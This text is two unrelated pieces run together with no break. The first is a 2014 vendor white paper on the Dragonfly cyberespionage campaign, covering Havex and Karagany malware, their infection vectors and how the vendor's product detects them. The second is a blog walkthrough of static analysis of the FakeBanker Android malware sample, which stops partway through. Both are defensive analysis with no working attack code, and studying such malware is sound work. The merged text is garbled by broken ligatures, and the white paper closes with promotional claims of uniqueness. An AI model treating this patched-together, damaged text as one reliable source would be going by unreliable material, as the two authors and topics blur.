Cyberespionage campaign hits energy
companies

SilentDefense helps detecting and mitigating the threat

Authors

Joel Langill - Industrial Cyber Security Expert, Founder of SCADAhacker.com
Emmanuele Zambon, PhD - SecurityMatters Founder and CTO
Daniel Trivellato, PhD - SecurityMatters Product Manager

8 July 2014



Contents

Preface 2

The Dragon
y cyberespionage campaign 3
The attacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
The targets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
Attack vectors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
Malware operation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5

SilentDefense detects the malware used by Dragon
y 7
The network Behavioral Blueprint . . . . . . . . . . . . . . . . . . . . . . . . . 7
Detection of network scan . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8
Detection of communication with C&C server . . . . . . . . . . . . . . . . . . . 9

Conclusions and recommendations 11
Acknowledgments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
About SecurityMatters . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
About the Authors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12



Preface
Over the past couple of weeks, cybersecurity vendors [1, 2, 4] have announced the uncovering
of a successful cyberespionage campaign carried out by the Dragon
y hacking group. In the
most recent string of attacks, Dragon
y has targeted multiple US and European energy
companies, successfully looting valuable process information in what appears to be the next
step in the cyberwarfare campaign against critical infrastructure organizations, after Stuxnet
in 2010. Cybersecurity vendors have scrutinized the campaign and presented an analysis of the
malware employed by Dragon
y to steal information from the infected computers. This short
paper revisits the main points of this investigation and illustrates why the implementation of
a defense-in-depth strategy is key to successfully counter cyberthreats like Dragon
y.


c 2014 SecurityMatters B.V. 2 www.secmatters.com



The Dragon
y cyberespionage
campaign
The Dragon
y hacker group has successfully mounted a cyberespionage operation against
US and European companies, mainly in the energy sector. The group managed to install a
remote access tool (RAT) in computers used for running Industrial Control Systems (ICS),
and to harvest data from the infected machines utilizing a payload designed for a specic
industrial protocol. According to Symantec [1], the Dragon
y campaign appears to have
a much broader focus than the preceding Stuxnet campaign: \While Stuxnet was narrowly
targeted at the Iranian nuclear program and had sabotage as its primary goal, Dragon
y
appears to have a much broader focus with espionage and persistent access as its current
objective with sabotage as an optional capability if required." There has been no proof that
any sabotage capabilities were used by the Dragon
y group to date, but capabilities may exist
in the toolkits employed, representing possibly the scariest part of the story, as they could
potentially open doors to dramatic scenarios. Was the stealing of industrial information from
energy companies only the rst step of a destructive cyberwarfare campaign?

The attacker

The Dragon
y hacker group (also known as Energetic Bear) appears to be in operation since
2011. It initially targeted organizations in the defense and aviation industries in US and
Canada, before moving their attention to US and Western European energy rms in 2013.
An analysis of the malware code used in the campaign has shown that the group worked mostly
during Eastern European working hours (Monday through Friday from 9AM to 6PM, UTC+4
time zone), suggesting that most group members worked in that region. The complexity of
the operation leads many to believe that Dragon
y is a well-funded, possibly state-sponsored
group of adversaries.


c 2014 SecurityMatters B.V. 3 www.secmatters.com



The targets

So far, the campaign has resulted in the leakage of information from multiple organizations,
many of which operate in the energy sector, and range from electricity generation compa-
nies, electricity grid and petroleum pipeline operators, and industrial system and equipment
providers. The majority of the victims are located in Europe, followed by the US. Figure 1
shows the top 10 countries by active infections (i.e. where the attacker has extracted infor-
mation from infected computers).

Figure 1: Top 10 countries by active infections [1]

In total, the number of infected machines that attempted to report to a malware command
and control (C&C) server is approximately 1500 [2]. These numbers represent hosts that have
been compromised and have established C&C communications, which does not necessarily
represent the number of actual industrial control system hosts compromised (this will be
discussed in more detail later in this paper). Precise information about the extent of the ICS
compromise is not available at the time of writing, but is expected to be signicantly less
than shown in the reported chart.

Attack vectors

Dragon
y used two pieces of malware in the attack; both were remote access tools (RATs)
designed to carry out the cyberespionage operations. The RATs were distributed and reached
the victims' machines through three attack vectors:

 E-mail campaign: selected executives and senior employees of targeted companies
would receive e-mails with a malicious PDF attachment containing the RAT. Symantec
identied seven dierent organizations targeted in this campaign; the number of emails
sent to each organization ranged from 1 to 84 [1].

 Watering hole attacks: these attacks targeted a number of legitimate websites likely
to be visited by individuals working in the energy sector. Upon visiting one of the
infected websites, the visitor would be redirected to another compromised legitimate
website hosting an exploit kit. This exploit kit would in turn install the RAT on the
visitor's computer.

 Software downloaded from ICS related vendors: Dragon
y members managed to
hack the websites of at least three dierent ICS related vendors, and insert malware


c 2014 SecurityMatters B.V. 4 www.secmatters.com



into the legitimate software they were making available for download to their clients.
The malware would then be installed on the victim's computer upon download of the
trusted software or update. The targeted vendors are based in Germany, Switzerland,
and Belgium. The rst identied software package to be Trojanized was used to provide
VPN access to programmable logic controller (PLC) and similar devices. The second
company manufactures a PLC type device, and had one of their communication drivers
Trojanized. The third company included in this campaign develops ICS systems for
primarily renewable energy markets.

Dragon
y employed these attack vectors in three successive phases of the campaign. The
e-mail attacks were conducted between February and June 2013; they were followed by the
watering hole attacks beginning in June 2013 that included the compromise of ICS vendor
websites. The rst ICS vendor website was compromised for a period of six weeks during the
period of June-July 2013, followed by the second vendor in January 2014. This second vendor
was able to identify the breach, notify aected users and mitigate the situation in about 10
days. It is estimated that around 250 downloads of the infected software occurred during this
phase [3]. The nal ICS vendor website breach occurred in April 2014 and lasted two weeks.

Malware operation

The attackers employed two RATs to steal information from the infected computers and
send it to C&C servers under the control of the attackers. Both of these RATs provided the
capability of downloading and executing les remotely via the C&C servers:

 The Havex RAT (also known as Backdoor.Oldrea): it allows the attacker to extract
data from the Outlook address book and ICS related software conguration les used
for remote access from the infected computer to other industrial systems. Furthermore,
it gathers system information on the installed programs, local le lists, and available
drives.

 Karagany (Trojan.Karagany): it allows the attackers to upload and download les
from the infected computer and to run executable les. It also contains advanced
features for collecting passwords, taking screenshots, and cataloguing documents stored
on the victim's machine. Karagany was already available on the underground market,
although the Dragon
y group might have modied the source code to best ts its
purposes.

Most of the victims were infected with the Havex RAT; Karagany was identied on only
5% of the infected computers. Havex appears to be custom malware either written by the
Dragon
y group itself or commissioned by them. Security analysts of F-Secure [2] have iden-
tied and analyzed 88 variants of Havex, which contacted 146 C&C servers to communicate
the stolen information. The majority of the C&C servers host blogs and content manage-
ment systems (primarily WordPress1), presumably compromised by the attackers using similar
exploits. These numbers strengthen the belief that the operation is state-sponsored.

From an operational viewpoint, certain payloads deployed with the Havex RAT exhibit
\ICS network sning" behavior. In particular, they attempt to enumerate and qualify the
devices in the local area network, and send the results back to the C&C servers. An analysis of
the malware executables highlights that the attackers were looking for OPC (Open Platform
Communications2) servers. OPC is a real-time data exchange protocol that supports bidirec-
tional reading/writing of process variables, but does not provide more advanced capabilities

1http://pastebin.com/raw.php?i=qCdMwtZ6
2OPC was renamed from \Object Linking and Embedding (OLE) for Process Control" to \Open Platform

Communications" in November 2011.


c 2014 SecurityMatters B.V. 5 www.secmatters.com



like device conguration and rmware updates. OPC is a standard way for process control
systems, applications and devices to interact with each other.

It is important to note that not all variants of the Havex RAT and its associated payloads
contained the code used to enumerate OPC services on a network. The observed payloads
containing the ICS (OPC) components are believed to have originated only via the Trojanized
software downloads from the three mentioned ICS vendor websites. This conclusion is based
on analysis of malware referenced by F-Secure [2] and obtained through VirusTotal3. This
means that the actual number of compromised ICS systems is likely much less than the
identied number of hosts/sites infected by the Havex malware along.

Figures 2 and 3 shows the relevant extract of the Havex payload containing the network
and OPC enumeration code. Looking at the malware code, we can indeed see that it uses
Microsoft Component Object Model (COM) interfaces to detect whether the machines iden-
tied during the network scan run OPC services. The two COM interfaces found in the code
are the following:

 IOPCServerList (CLSID = 13486D51-4821-11D2-A494-3CB306C10000)

 IOPCServerList2 (IID = 9DD0B56C-AD9E-43EE-8305-487F3188BF7A)

Figure 2: Extract from Havex Executable (taken from samples obtained from VirusTotal)

Figure 3: Extract from Havex Strings (taken from samples obtained from VirusTotal)

The fact that Dragon
y is gathering information about OPC servers and VPN connections
to PLCs might indicate that the nal objective is to gain access to the PLCs themselves,
which would enable the attackers to change, damage or disrupt the critical processes run by
the targeted organizations.

3https://www.virustotal.com/


c 2014 SecurityMatters B.V. 6 www.secmatters.com



SilentDefense detects the malware
used by Dragon
y
SecurityMatters' 
agship product SilentDefense ICS is capable of detecting Havex in multiple
stages of its operation, immediately alerting the security team of the threat and enabling
the targeted victim to mitigate it before damage is done or sensitive information is disclosed.
In particular, SilentDefense ICS detects Havex both when it attempts to connect to the
C&C server to download or upload les and information, and when it scans the network to
enumerate devices. In the next paragraphs we illustrate how SilentDefense ICS would detect
and alert about the Havex behavior.

The network Behavioral Blueprint

SilentDefense ICS is a network monitoring and intrusion detection system that automatically
models normal and acceptable network behavior and alerts whenever some network devices
perform activities that diverge from their intended operation. SilentDefense ICS operates in
two phases. First, it analyzes network communications and generates the network Behavioral
BlueprintTM. The Behavioral Blueprint denes communication patterns, protocols, message
types, message elds, and eld values that are normal for the monitored process. A review
of the Behavioral Blueprint immediately reveals network and system misconguration (e.g.,
rogue devices), unintended communications, and unusual eld values employed in the network,
in case Havex already infected some devices. After this setup phase, SilentDefense ICS can
be used for continuous monitoring to detect whenever network devices perform unintended
activities. In the case of Havex, these unintended activities are represented by the network
scan and the communication with the C&C servers.

Figures 4 and 5 show some examples of network Behavioral Blueprints as displayed by
SilentDefense ICS. The examples represent the two \types" of Behavioral Blueprint that
SilentDefense ICS can generate. In particular, Figure 4 shows the model of normal network
communications automatically generated by SilentDefense ICS' LAN Communication Prole
(LAN CP) engine. The LAN CP reports the observed network communications in terms of


c 2014 SecurityMatters B.V. 7 www.secmatters.com



communication patterns, protocols, and protocol message types normally used by the devices
in the network. Note that this includes details of which device has communicated using which
(D)COM interfaces. The controls implemented by the LAN CP make sure that whenever a
network device connects to an unusual IP address (e.g., the C&C server), or invokes a COM
interface that it has never used before or is not supposed to be used (e.g., the ones used by
Havex), SilentDefense ICS raises an alert.

Figure 4: An example of LAN Communication Proler Behavioral Blueprint

Figure 5 shows the model of normal protocol usage automatically generated by SilentDe-
fense ICS' Deep Protocol Behavior Inspection (DPBI) engine. This model presents all elds
(e.g. message types) and eld values that are normally used for a certain protocol within
the analysed network in the form of a protocol tree. The depicted tree was built for the
DCOM protocol. On the right of the tree, we show how for each protocol eld it is possible
to observe in detail and edit the values observed. Again, the DPBI engine guarantees that if
network devices use unusual (D)COM elds, the security team will immediately be alerted.

Figure 5: An example of Deep Protocol Behavioral Inspection Behavioral Blueprint

Detection of network scan

SilentDefense ICS can detect Havex through both LAN CP and DPBI engines. More precisely,
the LAN CP might raise an alert for two types of unusual network activities. The rst is the
network scan performed by the infected machine (see Figure 3). In fact, when scanning
the network, the infected machine might connect to devices with which it normally does
not communicate, or is not supposed to communicate. The second unusual activity is the
invocation of the IOPCServer COM interfaces. These interfaces are typically used only when
ICS software is installed or updated on a certain device; at SecurityMatters' customers, we
have never observed the use of these interfaces during normal operations. Their invocation


c 2014 SecurityMatters B.V. 8 www.secmatters.com



would thus result in alert being generated by SilentDefense ICS. If the invocation of these
interfaces is followed by a communication with an unknown external IP address (e.g. the
C&C server - as described in the following section), the host originating the communication
is likely to be infected by Havex.

Figure 6 shows an example of an alert generated by the LAN CP when it detects the
use of unusual COM interfaces. The unusual interfaces are indicated on the right: they are
highlighted in red and marked with a warning sign. On the left, the alert reports details of the
devices involved in the communication. This allows to immediately spot any devices infected
by Havex (the \source" device).

Figure 6: Alert generated by SilentDefense ICS when Havex invokes the COM interfaces to
identify OPC servers

Similarly, the DPBI engine would detect and report the use of unusual COM protocol
elds (and/or values) by any infected device. The alert generated by the DPBI engine would
indicate the \source" of the unusual communication, thus identifying the infected machine,
and the branch of the protocol tree that is not part of normal operations.

Detection of communication with C&C server

Further to detecting the network scan, SilentDefense ICS' LAN CP engine would alert the
security team also whenever the infected machine attempts to communicate with the mal-
ware C&C server. In fact, the infected machine would connect to an IP address that is not
\whitelisted" in the LAN CP model. This enables the security team to stop the communi-
cation before any sensitive network information is leaked, for instance by \blacklisting" the
C&C IP in the company rewall.

Figure 7 illustrates an example alert generated by the LAN CP engine when a network
device contacts an unusual IP address. The alert highlights in red and marks with a warning
the unusual IP address, which can be immediately blacklisted if not recognized by the security
team. Figure 7 illustrates an example alert generated by the LAN CP engine when a network
device contacts an unusual IP address. The alert highlights in red and marks with a warning
the unusual IP address, which can be immediately blacklisted if not recognized by the security
team.


c 2014 SecurityMatters B.V. 9 www.secmatters.com



Figure 7: Alert generated by SilentDefense ICS when Havex communicates with the C&C
server


c 2014 SecurityMatters B.V. 10 www.secmatters.com



Conclusions and recommendations
The Dragon
y hacker group is carrying out a cyberespionage campaign against energy com-
panies in the US and Europe. So far, the campaign has resulted in the successful looting of
strategic information from the energy companies' networks. The malware employed in the
campaign, however, may give the attackers the capability to launch subsequent attacks with
greater consequences.

It is fundamental that critical infrastructure organizations start adopting more progressive
countermeasures to today's cyberthreats. The waiting time is over - it has been demonstrated
more than once that skillful attackers can easily penetrate critical infrastructure networks, with
the potential of causing immeasurable damages to the economy, security, and public safety
and health of a country.

We believe that the implementation of a defense-in-depth strategy is key to successfully
counter the increasing cyberthreat. The rst defensive layer is of course represented by
rewalls and/or intrusion prevention systems, which keep out of a network the known and easy-
to-spot attacks. Cybersecurity vendors have already released signatures for their intrusion
prevention and host-based solutions to detect and stop the malware used by Dragon
y. As
indicated by F-Secure, however, 88 variants of the Havex malware have been identied so
far. Signatures might not oer protection to new variants released by Dragon
y, or to the
next malware employed in their campaign. It is therefore vital that along with traditional
cybersecurity solutions enterprises deploy a non-signature based network monitoring solution
like SilentDefense ICS, which does not rely on the knowledge of a threat to detect it and report
it. SilentDefense ICS is unique in its kind, as no other solution is capable of automatically
dening \normal network operations", and of analysing communications down to the values
exchanged by network devices. This unique approach ensures protection from today's as well
as tomorrow's threats.

Acknowledgments

We thank Damiano Bolzoni and Cli Gregory for their useful insights.


c 2014 SecurityMatters B.V. 11 www.secmatters.com



About SecurityMatters

SecurityMatters is an international company with business in many critical infrastructure
and industrial automation industries. Its research and development team works with many
dierent projects throughout the EU and USA and delivers game-changing network monitoring
and intrusion detection technology to make their customers more secure and in control.

About the Authors

Joel Langill Joel Langill is an Industrial Cyber Security Expert with
over 30 years of eld experience and is the founder of the globally rec-
ognized website SCADAhacker.com. He brings a unique perspective
to industrial security having spent over three decades deploying ICS
solutions covering most major industry sectors in over 35 countries en-
compassing all generations of automated control from pneumatic to
cloud-based services. He has been directly involved in the specication

and design of automation solutions spanning front-end engineering design, detailed design,
system integration, commissioning, and legacy system migration. Joel currently provides a
range of services to ICS end-users, system integrators, and governmental agencies worldwide.
He works closely with suppliers in both consulting and R&D roles, and has developed a special-
ized training curriculum focused on applied ICS security. He served as co-author and technical
editor for several books on industrial security. Joel serves on the Board of Directors for the
Milwaukee Chapter of InfraGard, and is an ICS research focal point to numerous CERT orga-
nizations around the world. Joel was an active contributor to the research conducted relating
to the impact of Heartbleed on ICS, was a key technical resource during the Stuxnet crisis,
and has been credited with several coordinated disclosures relating to industrial automation
and control.

Emmanuele Zambon Emmanuele Zambon has been involved in com-
puter security since 2003. In 2005, he also had graduated in Computer
Science from the Ca' Foscari University of Venice with a thesis on In-
trusion Detection Systems. During and after his studies he has been
employed in the Information Risk Management group of KPMG and in
Telecom Italia as a consultant, doing ethical hacking, network vulner-
ability/assessment, and software development/performance tuning. In

2006, Zambon followed Bolzoni to the Netherlands to work together on the development of
a new technology (the core of which now forms SilentDefense). Zambon received his PhD in
IT Risk Management in 2011 from the University of Twente. He is now working part-time as
a post-doc at the University of Twente, doing research on intrusion detection for industrial
process automation networks, and working part-time for SecurityMatters.

Daniel Trivellato Daniel Trivellato pursued his Master's degree in
Computer Science at the Free University of Bozen-Bolzano, Italy, grad-
uating cum laude in 2007. In 2012, Daniel received his PhD in computer
security from the Technische Universiteit Eindhoven, where he worked
on the design and implementation of innovative access control solutions
for dynamic, distributed, heterogeneous systems. His work was carried
out under the supervision of prof. dr. Sandro Etalle. Since 2012, Daniel

works as a project leader at SecurityMatters.


c 2014 SecurityMatters B.V. 12 www.secmatters.com



Bibliography

[1] Symantec Security Response Ocial Blog. Dragon
y: Western energy com-
panies under sabotage threat. http://www.symantec.com/connect/blogs/
dragon
y-western-energy-companies-under-sabotage-threat.

[2] F-Secure News from the Lab. Havex hunts for ics/scada systems. http://www.f-secure.
com/weblog/archives/00002718.html.

[3] Talk2M. Incident report. http://www.talk2m.com/en/full news.html?cmp id=7&news
id=51.

[4] Ars Technica. Active malware operation let attackers sabo-
tage us energy industry. http://arstechnica.com/security/2014/06/
active-malware-operation-let-attackers-sabotage-us-energy-industry/.


c 2014 SecurityMatters B.V. 13 www.secmatters.com



Disect Android APKs like a Pro - Static code analysis
blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/

July 7, 2014

Iâ€™ve started writing this IPython notebook in order to make myself more comfortable with
Android and its SDK. Due to some personal interests I thought I could also have a look at the
available RE tools and learn more about their pros & cos. In particular I had a closer look at
AndroGuard which seems to be good at:

Reverse engineering, Malware and goodware analysis of Android applications â€¦ and
more (ninja !)

I was charmed but its capabilities and the pythonic art of handling with APKs. In the 2nd step
Iâ€™ve needed a malware to play it, so I had a look at Contagio Mobile. There Iâ€™ve randomly
chosen a malware and got stucked with Fake Banker. There are some technical details
about the malware itself gained during automated tests which can be read here.

This article will only deal with the static source code analysis of the malware. A 2nd part
dedicated to the dynamic analysis is planed as well.

Start Kali Linux
Stay safe and run the stuff isolated:

âžœ  ~  virsh -c qemu:///system            

Welcome to virsh, the virtualization interactive terminal. 

Type:  'help' for help with commands 
      'quit' to quit 

virsh #  
virsh # list --all 
Id    Name                           State 
---------------------------------------------------- 
2     Ubuntu.GitLab                  running 
-     Linux.Kali                     shut off 
-     Ubuntu.Tracks                  shut off 
-     Windows7                       shut off 

virsh # start Linux.Kali 
Domain Linux.Kali started 

Now weâ€™re ready to login:

1/26



âžœ  ~  ssh kali.local 
victor@kali.local's password:  
Linux kali 3.7-trunk-amd64 #1 SMP Debian 3.7.2-0+kali8 x86_64 

The programs included with the Kali GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 

Install SDK

(env)root@kali:~/work/apk/SDK# wget http://dl.google.com/android/android-sdk_r22.6.2-
linux.tgz 
(env)root@kali:~/work/apk/SDK# tar -zxf android-sdk_r22.6.2-linux.tgz 
(env)root@kali:~/work/apk/SDK# export PATH=$PATH:/root/work/apk/SDK/android-sdk-
linux/tools(env)root@kali:~/work/apk/SDK# which monitor 
/root/work/apk/SDK/android-sdk-linux/tools/monitor 

Make sure you have the ia32-libs installed.

Setup PATH

import os 
import sys 

# Adjust PYTHONPATH 
sys.path.append(os.path.expanduser('~/work/bin/androguard')) 

# Setup new PATH 
old_path = os.environ['PATH'] 
new_path = old_path + ":" + "/root/work/apk/SDK/android-sdk-
linux/tools:/root/work/apk/SDK/android-sdk-linux/platform-
tools:/root/work/apk/SDK/android-sdk-linux/build-tools/19.1.0" 
os.environ['PATH'] = new_path 

# Change working directory 
os.chdir("/root/work/apk/") 

Setup IPython settings

%pylab inline 
import pandas as pd 
import numpy as np 
import matplotlib.pyplot as plt 
import networkx as nx 
from IPython.display import display_pretty, display_html, display_jpeg, display_png, 
display_json, display_latex, display_svg 

# Androguard stuff 
import androlyze as anz 
#import corae.bytecodes.dvm as dvm 

2/26



Populating the interactive namespace from numpy and matplotlib 

Get malicious APKs
Now that you got everything running itâ€™s time to get some malicious APKs to play with. On
contagio mobile youâ€™ll get tons of malicious files to look at. Iâ€™ve decided to look at the Fake
Banker:

(env)root@kali:~/work/apk/DroidBox/APK# wget 
http://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip 

Now youâ€™ll have to extract the archive. As mentioned on the site youâ€™ll have to contact the
sites maintainer in order to get the password for the files. Thanks to @snowfl0w for providing
me the password.

NOTE: The ordinary unzip command will fail to extract the files. You should install
p7zip.

(env)root@kali:~/work/apk/DroidBox/APK# 7z e FakeBankerAPKs.zip  

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18 
p7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU) 

Processing archive: FakeBankerAPKs.zip 

Extracting  7276e76298c50d2ee78271cf5114a176 
Enter password (will not be echoed) : 

Extracting  a15b704743f53d3edb9cdd1182ca78d1 
Extracting  aac4d15741abe0ee9b4afe78be090599 

Everything is Ok 

Files: 3 
Size:       629877 
Compressed: 622336 

Scratch the surface
In this section weâ€™ll have a brief look at the APK(s):

Which files does the APK contain?
How is the APK built?
Can we find some vital information e.g. permissions the APK will have when installed
on the device?
What about other ressources?

# Change CWD 
os.chdir("/root/work/apk/DroidBox/APK") 

3/26



Check APKs contents

%%bash 
for i in *; do file $i; done 

7276e76298c50d2ee78271cf5114a176: Zip archive data, at least v2.0 to extract 
a15b704743f53d3edb9cdd1182ca78d1: Zip archive data, at least v2.0 to extract 
aac4d15741abe0ee9b4afe78be090599: Zip archive data, at least v2.0 to extract 

Zippped files

%%bash 
unzip -l 7276e76298c50d2ee78271cf5114a176 

Archive:  7276e76298c50d2ee78271cf5114a176 
signed by SignApk 
 Length      Date    Time    Name 
---------  ---------- -----   ---- 
    1119  2008-02-29 05:33   META-INF/MANIFEST.MF 
    1172  2008-02-29 05:33   META-INF/CERT.SF 
    1714  2008-02-29 05:33   META-INF/CERT.RSA 
    5004  2008-02-29 05:33   AndroidManifest.xml 
  394740  2008-02-29 05:33   classes.dex 
    6426  2008-02-29 05:33   res/drawable-hdpi/ic_launcher1.png 
   14738  2008-02-29 05:33   res/drawable-hdpi/logo.png 
    2052  2008-02-29 05:33   res/drawable-ldpi/ic_launcher1.png 
    3231  2008-02-29 05:33   res/drawable-mdpi/ic_launcher1.png 
    8824  2008-02-29 05:33   res/drawable-xhdpi/ic_launcher1.png 
    1012  2008-02-29 05:33   res/layout/actup.xml 
     620  2008-02-29 05:33   res/layout/main.xml 
    4200  2008-02-29 05:33   res/layout/main2.xml 
     432  2008-02-29 05:33   res/menu/main.xml 
      56  2008-02-29 05:33   res/raw/blfs.key 
    1048  2008-02-29 05:33   res/raw/config.cfg 
    3196  2008-02-29 05:33   resources.arsc 
---------                     ------- 
  449584                     17 files 

Dump APKs content with apktool
%%bash 
cp 7276e76298c50d2ee78271cf5114a176 FakeBanker.apk 
java -jar /root/work/bin/apktool1.5.2/apktool.jar d 7276e76298c50d2ee78271cf5114a176 
output 

Destination directory (/root/work/apk/DroidBox/APK/output) already exists. Use -f 
switch if you want to overwrite it. 

AndroidManifest.xml

%%bash 
cat output/AndroidManifest.xml 

4/26



<?xml version="1.0" encoding="utf-8"?> 
<manifest android:versionCode="1" android:versionName="1.0" package="com.gmail.xpack" 
 xmlns:android="http://schemas.android.com/apk/res/android"> 
   <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
   <uses-permission android:name="android.permission.READ_SMS" /> 
   <uses-permission android:name="android.permission.RECEIVE_SMS" /> 
   <uses-permission android:name="android.permission.INTERNET" /> 
   <uses-permission android:name="android.permission.READ_PHONE_STATE" /> 
   <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
   <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
   <application android:theme="@style/AppTheme" android:label="@string/app_name" 
android:icon="@drawable/ic_launcher1" android:debuggable="true" 
android:allowBackup="false"> 
       <activity android:label="@string/app_name" 
android:name="com.gmail.xpack.MainActivity"> 
           <intent-filter> 
               <action android:name="android.intent.action.MAIN" /> 
               <category android:name="android.intent.category.LAUNCHER" /> 
           </intent-filter> 
       </activity> 
       <service android:name="com.gmail.xservices.XService" 
android:exported="false"> 
           <intent-filter> 
               <action android:name="XMainProcessStart" /> 
           </intent-filter> 
       </service> 
       <service android:name="com.gmail.xservices.XSmsIncom" /> 
       <receiver android:name="com.gmail.xbroadcast.OnBootReceiver"> 
           <intent-filter> 
               <action android:name="android.intent.action.BOOT_COMPLETED" /> 
           </intent-filter> 
       </receiver> 
       <receiver android:name="com.gmail.xbroadcast.MessageReceiver"> 
           <intent-filter android:priority="999"> 
               <action android:name="android.provider.Telephony.SMS_RECEIVED" /> 
           </intent-filter> 
       </receiver> 
       <receiver android:name="com.gmail.xservices.XRepeat" 
android:process=":remote" /> 
       <receiver android:name="com.gmail.xservices.XUpdate" 
android:process=":remote" /> 
       <activity android:name="ActUpdate"> 
           <intent-filter> 
               <action android:name="com.gmail.xpack.updateact" /> 
               <category android:name="android.intent.category.DEFAULT" /> 
           </intent-filter> 
       </activity> 
   </application> 
</manifest> 

Check for media

5/26



media_paths = !find output -regextype posix-egrep -regex "^.*\.
(png|jpg|jpeg|gif|bmp)$" 
display(media_paths) 
for p in media_paths: 
   display(Image(filename=p)) 

['output/res/drawable-ldpi/ic_launcher1.png', 
'output/res/drawable-mdpi/ic_launcher1.png', 
'output/res/drawable-xhdpi/ic_launcher1.png', 
'output/res/drawable-hdpi/logo.png', 
'output/res/drawable-hdpi/ic_launcher1.png'] 

Directory structure

%%bash 
# Ignore smali directory 
tree -f -I "smali" output/ 

6/26



output 
â”œâ”€â”€ output/AndroidManifest.xml 
â”œâ”€â”€ output/apktool.yml 
â””â”€â”€ output/res 
   â”œâ”€â”€ output/res/drawable-hdpi 
   â”‚   â”œâ”€â”€ output/res/drawable-hdpi/ic_launcher1.png 
   â”‚   â””â”€â”€ output/res/drawable-hdpi/logo.png 
   â”œâ”€â”€ output/res/drawable-ldpi 
   â”‚   â””â”€â”€ output/res/drawable-ldpi/ic_launcher1.png 
   â”œâ”€â”€ output/res/drawable-mdpi 
   â”‚   â””â”€â”€ output/res/drawable-mdpi/ic_launcher1.png 
   â”œâ”€â”€ output/res/drawable-xhdpi 
   â”‚   â””â”€â”€ output/res/drawable-xhdpi/ic_launcher1.png 
   â”œâ”€â”€ output/res/layout 
   â”‚   â”œâ”€â”€ output/res/layout/actup.xml 
   â”‚   â”œâ”€â”€ output/res/layout/main2.xml 
   â”‚   â””â”€â”€ output/res/layout/main.xml 
   â”œâ”€â”€ output/res/menu 
   â”‚   â””â”€â”€ output/res/menu/main.xml 
   â”œâ”€â”€ output/res/raw 
   â”‚   â”œâ”€â”€ output/res/raw/blfs.key 
   â”‚   â””â”€â”€ output/res/raw/config.cfg 
   â””â”€â”€ output/res/values 
       â”œâ”€â”€ output/res/values/ids.xml 
       â”œâ”€â”€ output/res/values/public.xml 
       â”œâ”€â”€ output/res/values/strings.xml 
       â””â”€â”€ output/res/values/styles.xml 

9 directories, 17 files 

First findings
Having a look at the AndroidManifest.xml file itself you can see that we have a
MessageReceiver with a quite high priority:

<receiver android:name="com.gmail.xbroadcast.MessageReceiver"> 
           <intent-filter android:priority="999"> 
               <action android:name="android.provider.Telephony.SMS_RECEIVED" /> 
           </intent-filter> 
</receiver> 

That looks very suspicious as well. What about the main entry point:
<activity android:label="@string/app_name" 
android:name="com.gmail.xpack.MainActivity"> 
           <intent-filter> 
               <action android:name="android.intent.action.MAIN" /> 
               <category android:name="android.intent.category.LAUNCHER" /> 
           </intent-filter> 
</activity> 

7/26



So obviously the class com.gmail.xpack.MainActivity contains the main entry point. In the
next steps we will have a closer look at the code. Besides that there are 2 files which might
be interesting:

output/res/raw/blfs.key
output/res/raw/config.cfg

Static code analysis using AndroGuard
# Use AndroGuard to static analysis 
# Have a look at https://code.google.com/p/androguard/wiki/RE for some introduction 
#a = anz.APK('KC.apk') 
a, d, dx = anz.AnalyzeAPK('FakeBanker.apk',decompiler='dex2jar') 
""" 
d = anz.DalvikVMFormat(a.get_dex()) 
dx = anz.VMAnalysis( d ) 
gx = anz.GVMAnalysis( dx, None ) 
d.set_vmanalysis( dx ) 
d.set_gvmanalysis( gx ) 
""" 

'\nd = anz.DalvikVMFormat(a.get_dex())\ndx = anz.VMAnalysis( d )\ngx = 
anz.GVMAnalysis( dx, None )\nd.set_vmanalysis( dx )\nd.set_gvmanalysis( gx )\n' 

Analyze the manifest file

a.files 

{'AndroidManifest.xml': 'Unknown', 
'META-INF/CERT.RSA': 'Unknown', 
'META-INF/CERT.SF': 'Unknown', 
'META-INF/MANIFEST.MF': 'Unknown', 
'classes.dex': 'Unknown', 
'res/drawable-hdpi/ic_launcher1.png': 'Unknown', 
'res/drawable-hdpi/logo.png': 'Unknown', 
'res/drawable-ldpi/ic_launcher1.png': 'Unknown', 
'res/drawable-mdpi/ic_launcher1.png': 'Unknown', 
'res/drawable-xhdpi/ic_launcher1.png': 'Unknown', 
'res/layout/actup.xml': 'Unknown', 
'res/layout/main.xml': 'Unknown', 
'res/layout/main2.xml': 'Unknown', 
'res/menu/main.xml': 'Unknown', 
'res/raw/blfs.key': 'Unknown', 
'res/raw/config.cfg': 'Unknown', 
'resources.arsc': 'Unknown'} 

a.permissions 

8/26



['android.permission.RECEIVE_BOOT_COMPLETED', 
'android.permission.READ_SMS', 
'android.permission.RECEIVE_SMS', 
'android.permission.INTERNET', 
'android.permission.READ_PHONE_STATE', 
'android.permission.ACCESS_COARSE_LOCATION', 
'android.permission.ACCESS_NETWORK_STATE'] 

a.get_activities() 

['com.gmail.xpack.MainActivity', 'com.gmail.xpack.ActUpdate'] 

a.get_services() 

['com.gmail.xservices.XService', 'com.gmail.xservices.XSmsIncom'] 

a.get_receivers() 

['com.gmail.xbroadcast.OnBootReceiver', 
'com.gmail.xbroadcast.MessageReceiver', 
'com.gmail.xservices.XRepeat', 
'com.gmail.xservices.XUpdate'] 

a.get_main_activity() 

u'com.gmail.xpack.MainActivity' 

d.CLASS_Lcom_gmail_xpack_MainActivity.METHOD_onCreate.source() 

